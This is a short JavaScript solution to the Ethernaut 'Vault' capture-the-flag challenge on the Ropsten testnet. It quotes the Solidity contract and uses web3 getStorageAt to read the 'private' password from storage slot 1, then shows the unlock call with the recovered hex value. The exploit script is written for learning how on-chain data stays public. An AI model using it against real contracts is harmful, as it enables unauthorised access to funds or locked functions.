/*

pragma solidity ^0.4.18;

contract Vault {
    bool public locked;
    bytes32 private password;

    function Vault(bytes32 _password) public {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
        locked = false;
        }
    }
}


Get the password just reading the blockchain
*/

// import Web3 from 'web3';
var Web3 = require('web3');
// The contract's address
var vaultAddress = '0xe2c4d226651fc4249e7f6b6387de2fdf4dc0c148';
// Run local ethereum node on localhost:8546
var web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/"+myToken));
// Read the storage at the contract's address, in slot 1 (password)
var password = web3.eth.getStorageAt(vaultAddress, 1);
password
// Display the password as binary
.then(function(pass){
    console.log("HEXA: " + pass);
    return pass;
})
// Display the password as text
.then(function(asciipass){
    console.log("ASCII: "+ web3.utils.toAscii(asciipass));
})
.catch(function(err){
    console.log(err);
    console.log("ERROR");
});

/*
Now that we have the password, we can unlock the vault:
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
*/